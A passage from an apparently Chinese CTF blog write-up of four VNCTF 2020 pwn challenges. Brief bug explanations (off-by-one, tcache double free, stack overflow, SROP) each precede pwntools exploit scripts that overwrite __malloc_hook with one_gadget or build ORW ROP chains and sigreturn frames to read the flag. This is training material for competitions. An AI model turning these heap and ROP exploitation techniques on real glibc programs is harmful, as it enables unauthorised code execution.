</span></span></code></pre></td></tr></table></div></div><h2 id=vnctf-2020>VNCTF 2020</h2><p>第一次见到堆题比栈题解答人数还多的比赛。</p><h3 id=simpleheap>simpleHeap</h3><p>编辑时存在 off by one，可以修改下一个 chunk 的大小后令其进入 unsorted bin 泄露 libc。然后修改 <code>malloc_hook</code> 为 <code>one_gadget</code>，注意需要通过 <code>realloc</code> 调整 <code>rsp</code> 来满足 <code>one_gadget</code> 条件。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\xe1</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span><span class=o>-</span><span class=mi>88</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc_hook</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 4 &lt;-&gt; 2</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>malloc_hook</span><span class=o>-</span><span class=mh>0x23</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>11</span><span class=p>,</span><span class=n>base</span><span class=o>+</span><span class=mh>0x4526a</span><span class=p>,</span><span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;realloc&#39;</span><span class=p>]</span><span class=o>+</span><span class=mi>13</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>_add</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x18</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=easytheap>easyTHeap</h3><p><code>free</code> 时指针未置 NULL。先利用 tcache double free 泄露堆地址，随后 tcache 投毒拿到 <code>tcache_perthread_struct</code>，修改 <code>count</code> 令 tcache 全被填满，再次 <code>free</code> 时就会进入 unsorted bin 泄露 libc。接下来依然是覆盖 <code>malloc_hook</code> 为 <code>one_gadget</code> 以及通过 <code>realloc</code> 调整 <code>rsp</code>，不过由于环境是 2.27，<code>one_gadget</code>、偏移量等等都会会有所不同，unsorted bin 泄露的地址也变成了 <code>main_arena+96</code> 而非 <code>+88</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span><span class=o>-</span><span class=mh>0x260</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;heap&#39;</span><span class=p>,</span><span class=n>heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>tps</span> <span class=o>=</span> <span class=n>heap</span><span class=o>+</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># 2 &lt;-&gt; 0</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>tps</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># 3 &lt;-&gt; 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># 4 &lt;-&gt; tps</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x07</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x70</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>tps</span><span class=o>+</span><span class=mh>0x78</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span><span class=o>-</span><span class=mh>0x60</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>one</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x10a38c</span>
</span></span><span class=line><span class=cl><span class=n>malloc_hook</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x07</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x70</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>malloc_hook</span><span class=o>-</span><span class=mh>0x8</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># 5</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=n>one</span><span class=p>,</span><span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;realloc&#39;</span><span class=p>]</span><span class=o>+</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>_add</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=warmup>warmup</h3><p>只能溢出 0x10 字节，但是上一个栈帧的 <code>buf</code> 空间较大且可控，因此可以多 ret 一次回到上一个栈帧的 <code>buf</code> 里构造 ROP 链。此外，程序开启了 seccomp 沙箱禁止 <code>execve</code>，因此我们只能构造 ORW 读 flag。幸运的是题目直接给了 puts 地址，可以得到 libc 地址从而使用 libc 的 gadgets，而 ORW 使用的缓冲区也可以利用 libc 的 rw 段。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>puts</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x21102</span>
</span></span><span class=line><span class=cl><span class=n>pop2</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x1150c9</span> <span class=c1># rdx,rsi</span>
</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x937</span>
</span></span><span class=line><span class=cl><span class=nb>open</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>read</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stderr_&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chain</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=c1># read(0,buf,8)</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>pop2</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=n>read</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1># open(buf,0,0)</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=n>pop2</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=nb>open</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1># read(3,buf,0x100)</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=n>pop2</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=n>read</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1># puts(buf)</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=n>puts</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;thing:&#39;</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=n>chain</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x70</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span><span class=n>ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;name?&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=s1>&#39;/flag</span><span class=se>\x00\x00\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=babybabypwn_1>babybabypwn_1</h3><p>看到程序主动调用 <code>syscall(15,&buf)</code> 可知是 SROP，我们需要在 <code>buf</code> 里放伪造的 Sigreturn Frame，然后程序就会调用 <code>rt_sigreturn</code> 恢复我们伪造的 frame。同样开启了沙箱，依然是构造 ORW 读 flag。</p><p>这里在使用 <code>pwnlib.rop.srop</code> 模块时，用 <code>SigreturnFrame</code> 构造时出现了一些问题，暂时还不清楚原因，使用了手动构造 frame 的办法。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>puts</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x21102</span>
</span></span><span class=line><span class=cl><span class=n>pop2</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x1150c9</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;syscall&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>open</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>read</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x3c6500</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>frame</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>12</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>         <span class=c1># rdi</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>         <span class=c1># rsi</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>         <span class=c1># rbp</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>         <span class=c1># rbx</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>buf</span><span class=o>-</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># rdx</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>         <span class=c1># rax</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>     <span class=c1># rcx</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>       <span class=c1># rsp</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>   <span class=c1># rip</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>         <span class=c1># eflags</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x33</span><span class=p>)</span>      <span class=c1># cs/fs/gs</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>7</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;message:&#39;</span><span class=p>,</span><span class=n>frame</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chain</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;/flag</span><span class=se>\x00\x00\x00</span><span class=s1>&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1># open(buf-0x10,0,0)</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span><span class=p>,</span><span class=n>buf</span><span class=o>-</span><span class=mh>0x10</span><span class=p>,</span><span class=n>pop2</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=nb>open</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1># read(3,buf+0x100,0x100)</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=n>pop2</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>buf</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span><span class=n>read</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1># puts(buf+0x100)</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span><span class=p>,</span><span class=n>buf</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span><span class=n>puts</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>flat</span><span class=p>(</span><span class=n>chain</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>更新：参考 AiDai 师傅的方法，可以自动构造 frame，并且不需要系统调用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>puts</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x21102</span>
</span></span><span class=line><span class=cl><span class=n>pop2</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x1150c9</span>
</span></span><span class=line><span class=cl><span class=nb>open</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>read</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=n>buf</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mh>0x100</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>buf</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>read</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;message:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>)[</span><span class=mi>8</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chain</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=c1># read(0,buf,0x100)</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>pop2</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=n>read</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1># open(buf,0,0)</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=n>pop2</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=nb>open</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1># read(3,buf,0x100)</span>
